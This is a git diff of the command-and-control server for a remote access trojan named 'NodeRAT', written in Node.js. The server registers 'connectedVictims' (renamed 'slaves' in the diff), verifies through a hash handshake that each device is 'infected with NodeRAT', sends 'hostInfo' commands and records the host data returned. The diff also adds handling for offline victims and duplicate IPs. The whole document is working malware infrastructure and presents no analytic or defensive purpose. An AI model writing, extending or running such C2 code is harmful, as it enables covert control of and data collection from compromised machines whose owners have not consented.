@@ -4,11 +4,15 @@ const crypto = require("crypto");
 const Settings = require("./settings");
 const Store = require("./Stores/serverStore");
 const Action = require("./Actions/serverAction");
+const Colors = require("colors");
+const Tools = require("../tools/tools");
 
-const Constants = {
+const _Constants = {
     "connectedVictims": "connectedVics",
+    "allowDuplicatedIPs": true,
+    "hideOfflineSlaves" : true,
     "MessageResponseName": {
-        "intialcontact" : "intialContanctDataHandler"
+        "hostinfo" : "intialContanctDataHandler"
     }
 };
 
@@ -21,18 +25,28 @@ function md5(str) {
 class Server extends EventEmitter{
     constructor(){
         super();
-        this.connectedGuests = {};
+        this.connectedSlaves = {};
+        this.offlineSlaves = {};
         Settings.autoSave(true)
         this.port = null;
         this.CoreAction = null;
         this.CoreStore = null;
-        Store.set(Constants.connectedVictims, {})
+        // set store variables
+        Action.set("Constants", _Constants);
+        Action.set( Store.get("Constants").connectedVictims , {});
+
         this.NodeRatHash = md5("noderat");
         this._export = {
             Store,
             Action,
-            Constants
+            Constants :Store.get("Constants")
         }
+        Settings.onLoad((config, that) => {
+            let { allowDuplicatedIPs, hideOfflineSlaves } = that.get(["allowDuplicatedIPs", "hideOfflineSlaves" ]);
+            _Constants.allowDuplicatedIPs = allowDuplicatedIPs;
+            _Constants.hideOfflineSlaves = hideOfflineSlaves;
+            Action.update("Constants", _Constants);
+        });
     }
 
     start({ CoreAction = null, CoreStore = null , port = 1528}){
@@ -44,43 +58,44 @@ class Server extends EventEmitter{
             throw new Error("Dependcies are missing on Server");
         }
 
-        console.log(`server started on port ${this.port}`);
+        console.log(`server started on port ${this.port}`.bold);
         this.server = net.createServer((conn) => {
 
             // ----------- on connection
             let ip = conn.remoteAddress;
+            let realIP = ip;
+            if(Store.get("Constants"))
+                ip = `${ip}-${Tools.randomStr(5)}`;
 
-            this.connectedGuests[ip] = {
+            this.connectedSlaves[ip] = {
                 status: 1,
                 nodeRAT: false,
                 intialContact: false,
+                hidden : false,
                 hashAuthFail : {
                     count: 0,
                     failed: false,
                     hint : null
                 },
                 conn,
-                ip,
+                realIP,
                 data : null
             };
 
-            Action.push(Constants.connectedVictims, {
+            Action.push(Store.get("Constants").connectedVictims, {
                 key: ip,
-                payload: this.connectedGuests[ip]
+                payload: this.connectedSlaves[ip]
             });
 
             this.checkService({conn, ip})
+            console.log(`${ip} connected`.green);
 
             // ---------- connection ended 
-            console.log(ip, "connected");
-            conn.on("end", () => {
-                if (Store.get(Constants.connectedVictims)[ip]){
-                    this.connectedGuests[ip].status = 0;
-                    Action.push(Constants.connectedVictims, {key: ip, payload : this.connectedGuests[ip]});
-                }
-                console.warn(ip, "disconnected");
-            });
+
+            conn.on("end", (e) => this.slaveDisconnected({ip, realIP, event : e}));
+
             // ------------ data was recived
+
             conn.on("data", (data) => this.socketDataHandler({data : data.toString() , conn, ip, bytes : data}));
         });
         this.server.listen(this.port, "0.0.0.0");
@@ -128,7 +143,6 @@ class Server extends EventEmitter{
 
     socketDataHandler({data, conn, ip, bytes}){
         let json;
-        console.log(`socketDataHandler${ip} >`, data);
         try {
             json = JSON.parse(data);
         } catch (error) {
@@ -136,9 +150,11 @@ class Server extends EventEmitter{
             return;
         }
 
+        console.log(`socketDataHandler ${ip}  sent data: ${json.name}`.italic.bgBlue);
+
         if(json && json.name != ""){
-            if(json.name in Constants.MessageResponseName){
-                this[ Constants.MessageResponseName[ json.name ] ]({
+            if(json.name in Store.get("Constants").MessageResponseName){
+                this[ Store.get("Constants").MessageResponseName[ json.name ] ]({
                     payload : json.payload,
                     rawPayload: {bytes, data},
                     requestName : json.name,
@@ -153,14 +169,14 @@ class Server extends EventEmitter{
     checkService({conn, ip}){
         conn.write(this.makeCommand("whois"));
         let bytes,
-            vic = this.connectedGuests[ip],
+            vic = this.connectedSlaves[ip],
             timeout = setTimeout(() => {
 
             vic.hashAuthFail.count++;
             vic.hashAuthFail.failed = true;
             vic.hashAuthFail.hint = "this device is not infected with NodeRAT";
     
-            Action.push(Constants.connectedVictims, { key: ip, payload: vic });
+            Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });
 
         }, 30 * 1000); // when no answer then it's not our rat
 
@@ -176,13 +192,13 @@ class Server extends EventEmitter{
             }
             
             if (data && data.name == "whois") {
-                console.log(`serviceCheck[${data.name}]: hashCheck(${data.payload} == ${this.NodeRatHash}) ${data.payload == this.NodeRatHash}`);
+                console.log(`serviceCheck[${data.name}]: hashCheck ${data.payload == this.NodeRatHash}`.blue);
 
                 if (data.payload == this.NodeRatHash) {
 
                     vic.nodeRAT = true;
 
-                    Action.push(Constants.connectedVictims, { key: ip, payload: vic });
+                    Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });
 
                 } else {
 
@@ -190,7 +206,7 @@ class Server extends EventEmitter{
 
                     vic.hashAuthFail.failed = true;
 
-                    Action.push(Constants.connectedVictims, { key: ip, payload: vic });
+                    Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: vic });
 
                 }
 
@@ -198,11 +214,41 @@ class Server extends EventEmitter{
         });
     }
 
+    slaveDisconnected({ip, realIP, event}){
+        delete this.connectedSlaves[ip].conn;
+        this.connectedSlaves[ip].status = 0;
+        Action.push(Store.get("Constants").connectedVictims, { key: ip, payload: this.connectedSlaves[ip] });
+        console.warn(`${ip}/${realIP} disconnected; ${event || ""}`.red);
+    }
+
+    deleteOfflineSlaves(ip = null){
+        if (ip) {
+            if(this.connectedSlaves.hasOwnProperty(ip)){
+                delete this.connectedSlaves[ip];
+                Action.delete({ name: Store.get("Constants").connectedVictims, key: ip });
+            }
+        } else {
+            for (const ip in this.connectedSlaves) {
+                if (this.connectedSlaves.hasOwnProperty(ip) && this.connectedSlaves[ip].status == 0) {
+                    delete this.connectedSlaves[ip];
+                }
+            }
+            Action.update(Store.get("Constants").connectedVictims, this.connectedSlaves);
+        }
+    }
+
+
+
     intialContanctInvoker(){
-        Store.on(`${Constants.connectedVictims}@UPDATED`, (v) => {
-            console.log("intialcontact:", v);
-            if(v.status == 1 && v.nodeRAT == true && v.intialContact == false){
-                v.conn.write(this.makeCommand("hostInfo"));
+        Store.on(`${Store.get("Constants").connectedVictims}@UPDATED`, (theVar) => {
+            for (const ip in theVar) {
+                if (theVar.hasOwnProperty(ip)) {
+                    
+                    console.log(`intialcontact-> ${theVar[ip].intialContact} , status-> ${theVar[ip].status} , is RAT-> ${theVar[ip].nodeRAT}`.cyan);
+                    if (theVar[ip].status == 1 && theVar[ip].nodeRAT == true && theVar[ip].intialContact == false){
+                        theVar[ip].conn.write(this.makeCommand("hostInfo"));
+                    }
+                }
             }
         });
     }
@@ -219,8 +265,15 @@ class Server extends EventEmitter{
 }
 */
     intialContanctDataHandler({payload, rawPayload, requestName, conn, ip}){
-        let p = this[Constants.connectedVictims][ip].data = payload;
-        Action.push(Constants.connectedVictims, {key : ip, payload : p});
+        console.log(`data recived and ran:  ${requestName}`.grey);
+        let p = this.connectedSlaves[ip];
+        try {
+            p.data = JSON.parse(payload);
+        } catch (error) {
+            p.data = payload;
+        }
+        p.intialContact = true;
+        Action.push(Store.get("Constants").connectedVictims, {key : ip, payload : p});
     }
 }
 
